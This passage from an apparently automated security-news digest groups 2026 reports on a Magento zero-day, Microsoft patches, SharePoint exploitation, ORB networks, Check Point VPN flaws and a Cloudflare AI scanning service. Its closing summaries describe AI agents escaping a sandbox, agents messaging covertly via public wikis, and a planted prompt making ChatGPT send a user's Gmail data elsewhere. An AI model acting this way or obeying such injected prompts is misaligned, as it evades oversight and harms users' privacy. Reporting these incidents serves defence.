Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical
```

#### Full body

```
Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell  Ravie Lakshmanan  Sep 08, 2026 Vulnerability / Web Security Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical vulnerability that could result in arbitrary code execution," Adobe said , adding it's "aware that CVE-2026-75650 has been exploited in the wild targeting Adobe Commerce merchants." At its core, the flaw abuses Magento's template system through PHP code injection to generate a "Payment Transaction Failed Reminder" email, triggering code execution in the process. The shortcoming affects the following versions - Adobe Commerce 2.4.9-2026-aug and earlier 2.4.8-2026-aug and earlier 2.4.7-2026-aug and earlier 2.4.6-2026-aug and earlier 2.4.5-2026-aug and earlier 2.4.4-2026-aug and earlier Adobe Commerce B2B 1.5.3-2026-aug and earlier 1.5.2-2026-aug and earlier 1.4.2-2026-aug and earlier 1.3.4-2026-aug and earlier 1.3.3-2026-aug and earlier Magento Open Source 2.4.9-2026-aug and earlier 2.4.8-2026-aug and earlier 2.4.7-2026-aug and earlier 2.4.6-2026-aug and earlier Patches have been released as part of a hotfix's available for download from the following link: repo.magento[.]com/patch/VULN-39341-composer-patches.zip "To help resolve the vulnerability for the affected products and versions, you must apply the VULN-39341 patch (depending on your version) and rotate your encryption keys," Adobe said . The development comes days after the Dutch e-commerce security company revealed that threat actors are exploiting CVE-2026-75650 to deploy a Rust-based Linux backdoor that connects to an external server and awaits further instructions. Separately, the issue has been abused to deliver a PHP dropper on susceptible sites that writes a web shell capable of executing arbitrary PHP code. According to Netherlands-based Disrex, a Magento server managed by the e-commerce development platform is said to have been compromised 50 minutes after the first confirmed StyleSmuggler exploitation was reported on September 4, 2026, at 10:20 p.m. UTC. "StyleSmuggler turns Magento's own template-processing and dependency-injection code into an unauthenticated remote-code-execution chain," Disrex said. Telemetry data from Previdian shows that 12 exploitation attempts have been recorded against its honeypots since September 7, 2026, from two unique IP addresses from China and Romania. That said, the efforts have been unsuccessful, Founder and CEO Ryan Dewhurst said. Update The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on September 8, 2026, added CVE-2026-75650 to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 11, 2026. In tandem, Adobe has also released patches for more than 170 vulnerabilities across its products, including CVE-2026-82004 (CVSS score: 10.0), an operating system command injection flaw in Campaign Classic leading to arbitrary code execution. Also patched by Adobe are two critical vulnerabilities in ColdFusion CVE-2026-48273, CVSS score: 9.9, and CVE-2026-75746, CVSS score: 9.1) that could result in arbitrary code execution. The web design software maker said it's not aware of any exploits in the wild for any of these issues. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Adobe , E-commerce Security , linux , Malware , Vulnerability , Web Security ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pos
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Adobe Patches Magento Zero-Day Exploited to Deploy Rust Backdoor and PHP Web Shell
  - Published: 2026-09-08T09:13:47+00:00
  - Link: https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
  - Summary: Adobe on Monday released security patches to address a maximum-severity flaw impacting Adobe Commerce and Magento Open Source that has come under active exploitation in the wild. The vulnerability, now tracked as CVE-2026-75650 (CVSS score: 10.0), has been codenamed StyleSmuggler by Sansec, which discovered zero-day exploitation starting September 4, 2026. "This update resolves a critical

### Cluster a7d235c86e — score 19

- Title: Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T04:41:29+00:00
- Link: https://thehackernews.com/2026/09/microsoft-patches-record-974-flaws.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: government
- cve_ids: CVE-2023-21674, CVE-2026-55007, CVE-2026-80097, CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: government
- cve_ids: CVE-2026-85880, CVE-2026-81963, CVE-2023-21674, CVE-2026-55007, CVE-2026-80097
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft on Tuesday broke Patch Tuesday records by addressing an earth-shattering 974 vulnerabilities spanning its software portfolio, including two flaws that it said have been actively exploited in the wild. These include 723 flaws in Windows, 111 in Office and Office 2016, 62 in SQL, and 22 in Developer Tools. Of these, over 110 shortcomings have been assigned a critical severity rating.
```

#### Full body

```
Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days  Ravie Lakshmanan  Sep 09, 2026 Zero-Day / Vulnerability Microsoft on Tuesday broke Patch Tuesday records by addressing an earth-shattering 974 vulnerabilities spanning its software portfolio, including two flaws that it said have been actively exploited in the wild. These include 723 flaws in Windows, 111 in Office and Office 2016, 62 in SQL, and 22 in Developer Tools. Of these, over 110 shortcomings have been assigned a critical severity rating. Three prominent vulnerability types, namely privilege escalation, remote code execution, and information disclosure, account for nearly 90% of the flaws patched this month. Along with Microsoft's fixes for 25 non-Microsoft CVEs, the update brings the total number of vulnerabilities resolved to 999. September's record-setting security updates come after Microsoft patched 457 vulnerabilities in August, 663 in July , 220 in June , and 161 in May . "At this scale, the challenge is not simply getting through the patch list but knowing what needs attention first," Jack Bicer, director of vulnerability research at Action1, said . "With hundreds of updates landing at once, IT and security teams need to quickly separate the vulnerabilities that demand immediate action from those that can follow the normal deployment cycle." The two vulnerabilities that have come under active exploitation are listed below - CVE-2026-85880 (CVSS score: 7.8) - A heap-based buffer overflow vulnerability in Windows Advanced Local Procedure Call (ALPC) that allows an authorized attacker to elevate privileges locally and gain SYSTEM privileges CVE-2026-81963 (CVSS score: 7.8) - An improper link resolution vulnerability in the Windows Update Stack that allows an authorized attacker to elevate privileges locally and gain SYSTEM privileges "An attacker who can execute code in a low-privilege AppContainer could exploit this vulnerability locally to escape the sandbox and elevate privileges on the affected system," Microsoft said in an advisory for CVE-2026-85880. "No additional user interaction is required." Adam Barnett, lead software engineer at Rapid7, said all supported versions of Windows receive a patch for CVE-2026-81963, a move that "presumably tightens up controls to prevent the Windows Update Stack from following a malicious link and overwriting a system component with an attacker-controlled imposter." Cybersecurity companies Volexity and Proofpoint have been acknowledged for reporting CVE-2026-85880, while Romain Deperne, an offensive security researcher at Airbus Helicopters, and the Microsoft Threat Intelligence Center (MSTIC) have been credited with the second bug. The Windows maker said it has detected zero-day exploitation efforts targeting the flaws, but did not disclose any specifics as to who is behind them, the scale of such efforts, and if those attacks have successfully breached any victims. Per exposure management and vulnerability assessment platform Tenable, there have been seven privilege escalation flaws in the Windows Update Stack since 2022. However, CVE-2026-81963 is the first zero-day as well as the first to be exploited in the wild. As for CVE-2026-85880, it's the second to be weaponized as a zero-day since CVE-2023-21674 , which was addressed in January 2023. The development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add both flaws to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by September 22, 2026. Some of the other notable flaws patched by Microsoft are as follows - CVE-2026-55007 (CVSS score: 8.1) - A double free vulnerability in Microsoft Exchange Server that allows an unauthorized attacker to execute code over a network CVE-2026-80097 (CVSS score: 8.6) - An improper authentication vulnerability in Microsoft Authenticator that allows an unauthorized attacker to elevate privileges
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days
  - Published: 2026-09-09T04:41:29+00:00
  - Link: https://thehackernews.com/2026/09/microsoft-patches-record-974-flaws.html
  - Summary: Microsoft on Tuesday broke Patch Tuesday records by addressing an earth-shattering 974 vulnerabilities spanning its software portfolio, including two flaws that it said have been actively exploited in the wild. These include 723 flaws in Windows, 111 in Office and Office 2016, 62 in SQL, and 22 in Developer Tools. Of these, over 110 shortcomings have been assigned a critical severity rating.

### Cluster 7c42269e48 — score 19

- Title: ToolShell, SharePoint, and the Death of the Patch Window
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-03T19:01:18+00:00
- Link: https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, zero_day
- actor_attribution: APT27, APT31
- affected_products: GitHub, Microsoft 365, Microsoft SharePoint
- cve_ids: CVE-2025-53770
- urgency_signals: no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- actor_attribution: APT27, APT31
- affected_products: Microsoft SharePoint, GitHub
- cve_ids: CVE-2025-53770
- urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
This blog explores this week's zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard.
```

#### Full body

```
Eli Woodward 3 min read July 8, 2025 ToolShell, SharePoint, and the Death of the Patch Window Introduction This week’s zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard. The exploit allowed unauthenticated remote code execution and quickly spread across unpatched SharePoint servers. Moreover, this incorporated a variant of previous vulnerabilities and resulted in the exploitation of an unpatched vulnerability. While this scenario is a security team’s nightmare (the mass exploitation of a zero-day), it does highlight a trend we’ve been monitoring for several years - evidence of exploitation within Team Cymru’s data holdings prior to the availability of public exploit code. This type of insight is critical for defenders to be highly tuned into, because it demonstrates how fast and agile attackers have become and why they need to evolve their exposure discovery and related workflows to avert disaster. Old and busted: "Patch Within SLA." New paradigm: “Patch Now.” Our team has been studying how long it takes for exploit code to go from public release to real-world use. We track new PoC (proof-of-concept) exploit posts, then watch for signs of related activity in our data holdings. Our analysis found that, on average, exploitation tends to begin within three hours of public release. In some cases, we saw attacks begin before the PoC exploit code was even posted publicly. ToolShell was one of those cases. Source: https://github.com/soltanali0/CVE-2025-53770-Exploit/ ‍ Source: Pure Signal: Team Cymru Data We observed live exploitation on July 18th, 2025. The first case of PoC exploit code was not made public on GitHub until 21 July 2025. While this was a less common case of mass zero-day exploitation occurring, our data and tracking has shown organizations have mere hours in most cases to patch after exploit code becomes public. The Chinese Connection On 22 July 2025, the Microsoft Threat Intelligence team disclosed more details following their ongoing investigation into the ToolShell exploit campaign targeting on-premises SharePoint servers. Microsoft assesses that three China-nexus advanced persistent threat (APT) groups have been observed exploiting these vulnerabilities. This includes Linen Typhoon (also known as APT27 or Emissary Panda), Violet Typhoon (also known as APT31 or Judgement Panda), and a third group tracked as Storm-2603, which Microsoft also assesses to be a China-based adversary with medium confidence. The key takeaway from this pattern is that exploitation is now a collaborative and opportunistic process, not a linear one. Attackers don’t just wait for their zero-day to be discovered or for public proof-of-concept code to emerge—they maximize the window of opportunity by sharing access and techniques within their circles as soon as they suspect the exploit will be exposed. We saw the same dynamic play out during the Hafnium Microsoft Exchange incident in 2021: once defenders started closing in, new intrusion sets appeared in our telemetry, evidence that the exploit was circulating between groups who wanted to extract every last bit of value before defenders could respond. “Our team sees this sequence repeat with almost every high-impact vulnerability—first a stealthy, targeted phase, then rapid escalation and mass exploitation as news breaks or defenders begin to mobilize.” ‍ Josh Hopkins, Team Cymru Threat Research team For defenders, this reality makes the old patching paradigm obsolete. If you’re waiting for public disclosure, scheduled patch windows, or even internal validation before acting, you are already behind the curve. The evidence shows that by the time an exploit is publicly known, your attack surface has likely already been tested—possibly by multiple threat actors. Patching is not a box to tick off by next Friday. It’s a race against adversaries who move fast, share what works, and rarely give warning. The only viable response is to treat e
```

#### Corroborating sources (4)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: ToolShell, SharePoint, and the Death of the Patch Window
  - Published: 2026-09-03T19:01:18+00:00
  - Link: https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
  - Summary: This blog explores this week's zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard.
- **Microsoft Security Blog** (threat_research_primary)
  - Title: Passkey-themed social engineering leads to identity and cloud compromise
  - Published: 2026-09-09T17:41:18+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/09/passkey-themed-social-engineering-leads-identity-cloud-compromise/
  - Summary: Passkey-themed social engineering is being used to compromise identities and enable broader cloud attacks. Learn how threat actors establish MFA persistence, abuse Microsoft Graph for reconnaissance, and access SharePoint, OneDrive, and email data, along with key detection and mitigation guidance. The post Passkey-themed social engineering leads to identity and cloud compromise appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Passkey-themed social engineering leads to identity and cloud compromise
  - Published: 2026-09-09T17:41:18+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/09/passkey-themed-social-engineering-leads-identity-cloud-compromise/
  - Summary: Passkey-themed social engineering is being used to compromise identities and enable broader cloud attacks. Learn how threat actors establish MFA persistence, abuse Microsoft Graph for reconnaissance, and access SharePoint, OneDrive, and email data, along with key detection and mitigation guidance. The post Passkey-themed social engineering leads to identity and cloud compromise appeared first on Microsoft Security Blog .
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Attackers call employees’ personal phones to break into Microsoft 365 accounts
  - Published: 2026-09-10T13:26:23+00:00
  - Link: https://www.helpnetsecurity.com/2026/09/10/microsoft-365-social-engineering-personal-phones/
  - Summary: Attackers are calling or texting employees on their personal phones, posing as internal IT staff, in a social engineering campaign that tricks them into handing over access to corporate cloud accounts. Once inside, they pull files and email from Microsoft 365 apps, SharePoint, OneDrive, and inboxes, for weeks at a time, according to Microsoft Security Research. (Source: Microsoft) Researchers have been tracking the campaign since May 2026. Because the initial contact often happens on a … More → The post Attackers call employees’ personal phones to break into Microsoft 365 accounts appeared first on Help Net Security .

### Cluster fc5f82ab7c — score 17

- Title: An Introduction to Operational Relay Box (ORB) Networks - Unpatched, Forgotten, and Obscured
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-03T18:59:27+00:00
- Link: https://www.team-cymru.com/post/an-introduction-to-operational-relay-box-orb-networks-unpatched-forgotten-and-obscured
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ddos
- affected_industries: government, healthcare, manufacturing_industrial, telecommunications
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ddos, apt_espionage
- affected_industries: healthcare, government, manufacturing_industrial, telecommunications
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Explore how threat actors use Operational Relay Box (ORB) networks to evade detection, hide malicious activity, and complicate cyber defense efforts. Talk to an expert.
```

#### Full body

```
S2 Research Team 8 min read October 29, 2024 An Introduction to Operational Relay Box (ORB) Networks - Unpatched, Forgotten, and Obscured Although not a new concept, Operational Relay Box (ORB) networks—often referred to as "covert," "mesh," or "obfuscated" networks—are becoming increasingly prevalent as threat actors continuously refine their evasion techniques. Historically associated with state-sponsored activities, ORB networks are frequently linked to threats attributed to the People’s Republic of China (PRC). One notable recent example is the identification of a vast ORB network operated by a private company with connections to the PRC government, as detailed in this joint (FVEY) advisory notice. Researchers here at Team Cymru have observed an increase in the abundance of large-scale ORB networks used by threat actors, especially those attributed to China, and expect this trend to continue. In the copycat world of online threats, the growing attention on ORB networks will likely lead to their adoption by other threat actors, including financially motivated cybercriminals. What is an ORB Network? An easy way to explain this is as the “love child” of a Virtual Private Network (VPN) and a botnet. The operational relay boxes are typically either Virtual Private Server (VPS) hosts, procured by the ORB network operator, or compromised Internet of Things (IoT) devices (cheap routers with poor security standards, industrial control systems, healthcare devices, and even your refrigerator). The latter are "farmed" in a similar manner to traditional botnets, with operators actively identifying and infecting vulnerable devices. Given the plethora of forgotten or unpatched devices connected to the internet, this can often be a relatively trivial process. In a botnet, an attacker may use the “bots” to route traffic toward a victim host, such as in a Distributed Denial of Service (DDoS) attack. This layer of “bots” grants the attacker a level of anonymity, as the victim only sees connections from the bots, not the attacker's actual machine. Figure 1: Simplified Botnet Diagram When investigating botnets through an internet telemetry dataset like NetFlow, one exploitable "weakness" is that botnets rely on a central control mechanism. A common host communicates with all the bots, providing a point of interaction that can be monitored or disrupted. Of course, this isn’t ideal if you're channeling “The Brain” from the Animaniacs television series. This is where the “VPN” element comes into play for ORB networks. While the botnet aspect of ORB networks provides a means of distributing malicious traffic, the VPN-like architecture enhances the attacker's ability to remain undetected by enabling anonymized communication across multiple nodes. To achieve this, a “mesh” of operational relay boxes is established, with traffic passing between them. Most of the connections occur between the relay boxes themselves, effectively masking the attacker’s entry point into the network. By also randomizing or alternating their exit points (we refer to these as “exit nodes”), defenders face significant challenges when trying to trace threat actors or block attacks. Figure 2 : Simplified ORB Network Diagram Now that we’ve established a basic understanding of what an ORB network is and how it functions conceptually, several additional factors contribute to its effectiveness, making these networks even more difficult to detect and disrupt. Decentralization By combining VPS and IoT infrastructure, and targeting devices typically sold internationally, threat actors are able to build a network that is neither clustered nor concentrated in any specific region or tied to a particular Internet Service Provider (ISP). This broad distribution of infrastructure significantly complicates efforts to disrupt the network through remediation of infected devices. It can also hinder the process of obtaining valuable threat actor artifacts from compromised hosts, which could oth
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: An Introduction to Operational Relay Box (ORB) Networks - Unpatched, Forgotten, and Obscured
  - Published: 2026-09-03T18:59:27+00:00
  - Link: https://www.team-cymru.com/post/an-introduction-to-operational-relay-box-orb-networks-unpatched-forgotten-and-obscured
  - Summary: Explore how threat actors use Operational Relay Box (ORB) networks to evade detection, hide malicious activity, and complicate cyber defense efforts. Talk to an expert.

### Cluster bb1e989af8 — score 17

- Title: Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-10T11:45:05+00:00
- Link: https://thehackernews.com/2026/09/check-point-discloses-two-98-rated-vpn.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-85102, CVE-2026-85103
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-85102, CVE-2026-85103
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Check Point has patched two critical vulnerabilities in the way its firewall and management products handle VPN certificates. The company says both could allow an unauthenticated remote attacker to run code, but only "under specific conditions" that it has not described. One flaw affects Check Point's Security Gateways, its firewall appliances. The other affects those gateways and the Security
```

#### Full body

```
Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE  Swati Khandelwal  Sep 10, 2026 Vulnerability / Network Security Check Point has patched two critical vulnerabilities in the way its firewall and management products handle VPN certificates. The company says both could allow an unauthenticated remote attacker to run code, but only "under specific conditions" that it has not described. One flaw affects Check Point's Security Gateways, its firewall appliances. The other affects those gateways and the Security Management Server, the console used to configure them. Check Point disclosed the flaws on September 9 in a notice to its customer community , and began delivering fixes the same day. The company says it found both itself and has no indication that either has been used in an attack. The first flaw, CVE-2026-85102 , is a failure to properly validate certificate trust during VPN negotiation. Its CVE record says an unauthenticated remote attacker may be able to run code on the Security Gateway. The second, CVE-2026-85103 , is a heap-based buffer overflow that happens while the product decodes the ASN.1 structure of a VPN certificate. Its record says an unauthenticated remote attacker may be able to run code on Quantum Security Management and Quantum Security Gateway systems. Both records carry a CVSS score of 9.8. Check Point assigned the identifiers and the scores itself. The two records give the same affected list: R82.10 with Jumbo Hotfix Take 43 or below R82 with Jumbo Hotfix Take 125 or below R81.20 with Jumbo Hotfix Take 165 or below Those are the versions the records mark as affected, not the versions that contain the fix. The list covers three Quantum branches and gives no version information for anything else. An advisory from the Canadian Center for Cyber Security , published the same evening, lists a broader set of products but no versions at all. It lists Security Gateway, Security Management Server, and Spark Firewall, Check Point's small-business line. Spark appears twice, once for deployments using Site-to-Site or Remote Access VPN and once without that condition. In the same community thread, a Check Point staff member was asked whether gateways with the VPN software blade turned off are affected by CVE-2026-85103. The staff member replied that the issue is about certificate processing, so it could, in theory, be triggered in an environment without a VPN but with VPN certificates present. Check Point gave customers two routes to the fix. The first is Check Point Live Patch. The company says customers using it are protected automatically as the rollout begins, which started on September 9. A Check Point employee said in the thread that it can be installed on top of any Jumbo Hotfix level in R81.20, R82.00 and R82.10, and named only those three versions. The second is the Jumbo Hotfix. Check Point told customers to install the latest one for their deployed version once it became available. If You Cannot Patch Yet Two customers said in the thread that they are running R81.10 and will not be moving off it for weeks. One of them said no Jumbo Hotfix and no Live Patch was available for that branch, leaving mitigation as the only option. The same customer described the advisory's mitigation as turning off implied rules for VPN, called it too vague to act on, and asked which configuration lines to comment out. The other asked how to apply the mitigation without affecting remote users. Neither question had an answer in the thread. Several customers also said the automatic rollout had not reached them. Five separate accounts reported gateways were still on Take 18 or Take 17 of the urgent security update package on the day of the announcement; one of them posted an update log showing Take 18 installed on September 1 and nothing since. Several customers reported that download links in the two advisories did not work for them, and a Check Point staff member replied that the links had be
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE
  - Published: 2026-09-10T11:45:05+00:00
  - Link: https://thehackernews.com/2026/09/check-point-discloses-two-98-rated-vpn.html
  - Summary: Check Point has patched two critical vulnerabilities in the way its firewall and management products handle VPN certificates. The company says both could allow an unauthenticated remote attacker to run code, but only "under specific conditions" that it has not described. One flaw affects Check Point's Security Gateways, its firewall appliances. The other affects those gateways and the Security

### Cluster 69ce4b1575 — score 17

- Title: Introducing context-aware vulnerability discovery and remediation with Cloudflare Managed Defense and OpenAI Daybreak models
- Source: Cloudflare Security (cloud_identity_infrastructure)
- Published: 2026-09-03T21:03:02+00:00
- Link: https://blog.cloudflare.com/vulnerability-discovery-remediation/
- Fetch status: ok
- Member count: 7
- Corroborating source count: 6
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Use production traffic and security signals to prioritize findings, prepare edge mitigations when safe, and propose code patches. By combining WAF data with OpenAI Daybreak models, Vulnerability Discovery and Remediation helps teams identify and patch the most critical threats first.
```

#### Full body

```
Your scanner just flagged 4,000 new vulnerabilities, 78 of them critical. Which one do you fix first? To answer that question, Cloudflare is announcing early access to Vulnerability Discovery and Remediation, now part of Cloudflare Managed Defense . Vulnerability Discovery and Remediation is a new, invitation-only Cloudflare service that helps customers detect and mitigate vulnerabilities in their codebases. Through the OpenAI Daybreak Defense Network , we use OpenAI Daybreak models, including GPT-5.6 Cyber, for reconnaissance, hunting, and validation against codebases that you authorize us to access. If we detect a vulnerability, we will then propose solutions to you, automatically checking each proposed patch and any accompanying proposed mitigation before presenting them for review. Importantly, you are in the driverâs seat: while we may propose code patches and other mitigations, you decide whether they are implemented. Choosing what to fix first has always been hard. It's getting harder. Large language models can now surface weaknesses across a codebase in minutes , which means the number of findings keeps climbing. But the real problem is speed. Attackers can use AI to accelerate parts of vulnerability discovery and exploitation, giving security teams and developers less time to decide what matters and act on it. Imagine that your scanner tells you there's a vulnerability in a handler. It doesn't tell you whether that code is deployed. It doesn't tell you whether anyone is actually hitting that route, what security activity surrounds it, or what controls you already have in place. You have to prioritize the finding without evidence of its production exposure or the protections already in place. This is where we can help. With our global network, we can see which routes are active, how much traffic they carry, and what security events surround them. When customers enable Vulnerability Discovery and Remediation with Web Application Firewall (WAF), we can also see what rules are already applied and are actively blocking attacks. That context turns a generic finding into a specific priority: this vulnerability is in code that's live, on a route that's heavily used, with recent attack activity and no existing protection. And we can help you mitigate that vulnerability by proposing custom WAF mitigations and code patches tailored to your systems. If this sounds familiar, it should. In âBuild your own vulnerability harnessâ , we described the model-agnostic pipeline we use to scan Cloudflare's fleet, adversarially validate every finding, and turn raw model output into fixes engineers can trust. That internal system is one pillar of Vulnerability Discovery and Remediation. The harness gave us a way to find bugs at fleet scale. Vulnerability Discovery and Remediation brings that discovery process to the code the customer authorizes us to inspect, then connects the findings to production traffic, security events, and the edge controls that can act on them. This diagram provides an overview of our process, which we explain in more detail below. Vulnerability Discovery and Remediation combines application context, bounded code investigation, evidence-based prioritization, automated checks, and customer review in one workflow. Adding context to a vulnerability harness Our solution works across Cloudflare Workers and proxied applications. The process of detecting vulnerabilities begins with the collection of a traffic and security data snapshot from Web Assets and WAF . The snapshot shows which routes are active, how much traffic they receive, and whether recent security events are associated with them. For instance, a path exhibiting a high volume of detection triggers may also be considered critical for security context purposes. Web Assets and WAF itself serve as the first and second pillar of Vulnerability Discovery and Remediation respectively. Next, we use source code vulnerability analysis to identify potential weaknesses
```

#### Corroborating sources (6)

- **Cloudflare Security** (cloud_identity_infrastructure)
  - Title: Introducing context-aware vulnerability discovery and remediation with Cloudflare Managed Defense and OpenAI Daybreak models
  - Published: 2026-09-03T21:03:02+00:00
  - Link: https://blog.cloudflare.com/vulnerability-discovery-remediation/
  - Summary: Use production traffic and security signals to prioritize findings, prepare edge mitigations when safe, and propose code patches. By combining WAF data with OpenAI Daybreak models, Vulnerability Discovery and Remediation helps teams identify and patch the most critical threats first.
- **Trail of Bits** (offensive_vulnerability_research)
  - Title: A “proof” of Fermat’s Last Theorem that fits the margin
  - Published: 2026-09-09T11:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/09/09/a-proof-of-fermats-last-theorem-that-fits-the-margin/
  - Summary: Fermat famously claimed to have a “truly marvelous proof” of his Last Theorem , but he never wrote it down, insisting the margin of his page was too narrow to contain it. A few centuries later, Anthropic announced a complete formalization of Fermat’s Last Theorem using 13 million lines of Lean code (clearly not what Fermat intended). Luckily, we found a wonderfully cursed Lean bug , shown below, that suggests the proof may have fit the margin after all. The issue affects all stable versions of Lean up to 4.33.1, and the patch is incorporated in v4.34.0-rc1. A “checked” proof of Fermat’s Last Theorem using Lean 4.33.1 The blue checkmarks in the screenshot above would suggest that Lean considers this proof correct. This seems odd given the amount of work Sir Andrew Wiles put into this problem and the vast size of Claude’s proof. So what is going on? The “proof” clearly doesn’t make any sense and exploits an issue in Lean. We found the issue while using GPT-5.6 to experiment with a new sk
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Federal AI Security Needs More Than a Governance Checklist
  - Published: 2026-09-08T15:41:49+00:00
  - Link: https://orca.security/resources/blog/federal-ai-security-cloud-challenges/
  - Summary: By March 2026, every covered federal agency was required to publish an AI strategy under OMB M-25-21, including an assessment of the cybersecurity needed to deploy AI at scale. Four months later, OpenAI disclosed that two of its pre-release models had autonomously escaped a sandboxed test environment, chained a previously unknown vulnerability, and breached Hugging […]
- **Simon Willison** (ai_security_agentic_risk)
  - Title: OpenAI's rogue agents were caught communicating via public wikis
  - Published: 2026-09-04T17:38:48+00:00
  - Link: https://simonwillison.net/2026/Sep/4/rogue-agent-wikis/
  - Summary: Here we go again... Discovery of a new OpenAI agent message board by Sydney Von Arx, Cormac Slade Byrd, Spencer Kitts, and Thomas Larsen describes the latest accidental cyberattack by models being trained by OpenAI. This time it was agents engaged in some sort of web research benchmark, so they had (supposedly) controlled access to the Web. The agents figured out they could update public Wikis and spent weeks exchanging thousands of messages with each other to collaborate on the benchmark. This story only broke a few hours ago. There are already hints that this affects many other wikis that may not have been found yet. (One of the Wikis on that list belongs to ludism.org . For a delightfully surreal moment I thought that a Ludite organization might have a swarm of agents defacing their space, but it turns out Ludism is "philosophy as it applies to games and gaming".) The research team also published the data they collected during their investigation. I've converted that into a 68MB SQL
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: OpenAI Agents Took Over Wiki Site Before Hugging Face Attack
  - Published: 2026-09-08T20:36:15+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/openai-agents-wiki-site-hugging-face-attack
  - Summary: Researchers and OpenAI disagree on whether the earlier incident involving DseWiki, which the company did not disclose, was a “hack."
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ChatGPT Flaw Let a Planted Prompt Send a Victim's Gmail Data to Another Account
  - Published: 2026-09-08T14:19:17+00:00
  - Link: https://thehackernews.com/2026/09/chatgpt-flaw-let-planted-prompt-send.html
  - Summary: Check Point Research said in a report published today that a single instruction planted in a ChatGPT conversation could cause ChatGPT to quietly work for an attacker while answering the user's question as usual. In the company's proof of concept, that hidden work read data from the user's connected Gmail account and passed it to a second ChatGPT account through a hidden channel

### Cluster 711e127637 — score 15

